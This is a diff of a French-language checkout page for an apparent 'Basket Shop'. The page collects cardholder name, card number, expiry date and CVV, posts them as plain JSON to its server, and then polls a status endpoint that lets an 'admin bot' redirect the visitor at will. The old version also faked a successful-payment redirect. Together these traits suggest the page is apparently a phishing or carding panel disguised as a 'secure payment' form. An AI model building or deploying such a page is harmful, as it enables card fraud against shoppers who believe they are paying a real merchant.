@@ -1,66 +1,100 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Paiement</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Paiement - Basket Shop</title>
   <style>
-    #loader { display: none; font-size: 18px; text-align: center; margin-top: 20px; }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      color: #333;
+      text-align: center;
+      padding-top: 60px;
+    }
+    h1 {
+      color: #222;
+    }
+    form {
+      display: inline-block;
+      background: white;
+      padding: 20px 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      margin-top: 30px;
+      width: 320px;
+    }
+    input {
+      display: block;
+      width: 100%;
+      margin: 10px 0;
+      padding: 10px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 1em;
+    }
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 12px 18px;
+      border-radius: 6px;
+      font-size: 1em;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
   </style>
 </head>
 <body>
-  <h2>💳 Paiement</h2>
+  <h1>💳 Paiement sécurisé</h1>
+  <p>Entrez vos informations de paiement pour finaliser votre commande.</p>
+
   <form id="paymentForm">
-    <input type="text" name="nomTitulaire" placeholder="Nom du titulaire" required><br>
-    <input type="text" name="cardNumber" placeholder="Numéro de carte" required><br>
-    <input type="text" name="expiry" placeholder="MM/AA" required><br>
-    <input type="text" name="cvv" placeholder="CVV" required><br>
-    <button type="submit">Payer maintenant 💰</button>
+    <input type="text" id="nomTitulaire" placeholder="Nom du titulaire" required />
+    <input type="text" id="cardNumber" placeholder="Numéro de carte" maxlength="19" required />
+    <input type="text" id="expiry" placeholder="Date d’expiration (MM/AA)" required />
+    <input type="text" id="cvv" placeholder="CVV" maxlength="4" required />
+    <button type="submit">Payer maintenant 💳</button>
   </form>
 
-  <div id="loader">⏳ Paiement en cours, merci de patienter...</div>
-
   <script>
-  const form = document.getElementById('paymentForm');
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const data = {
-      nomTitulaire: form.nomTitulaire.value,
-      cardNumber: form.cardNumber.value,
-      expiry: form.expiry.value,
-      cvv: form.cvv.value
-    };
-    try {
-      await fetch('/api/payment', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      });
-    } catch (err) {
-      console.warn('Erreur paiement:', err);
-    }
+    document.getElementById('paymentForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const cardNumber = document.getElementById('cardNumber').value;
+      const expiry = document.getElementById('expiry').value;
+      const cvv = document.getElementById('cvv').value;
+      const nomTitulaire = document.getElementById('nomTitulaire').value;
 
-    form.style.display = 'none';
-    document.getElementById('loader').style.display = 'block';
+      try {
+        // Envoie les infos au serveur
+        await fetch('/api/payment', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ cardNumber, expiry, cvv, nomTitulaire })
+        });
 
-    // ✅ Simulation paiement réussi après 5 secondes
-    setTimeout(() => {
-      window.location.href = '/accepted.html';
-    }, 50000);
-  });
+        // Redirige vers le loader
+        window.location.href = '/loader.html';
+      } catch (err) {
+        alert("Erreur lors de l'envoi du paiement");
+      }
+    });
 
-  // Polling pour redirection admin bot
-  async function pollRedirect() {
-    try {
+    // Vérifie si le bot admin a redirigé l'utilisateur
+    async function checkStatus() {
       const res = await fetch('/api/status');
       const data = await res.json();
-      if (data.redirect && window.location.pathname !== data.redirect) {
+      if (data.redirect) {
         window.location.href = data.redirect;
+      } else {
+        setTimeout(checkStatus, 2000);
       }
-    } catch (e) {}
-    setTimeout(pollRedirect, 2000);
-  }
-  pollRedirect();
+    }
+    checkStatus();
   </script>
 </body>
 </html>
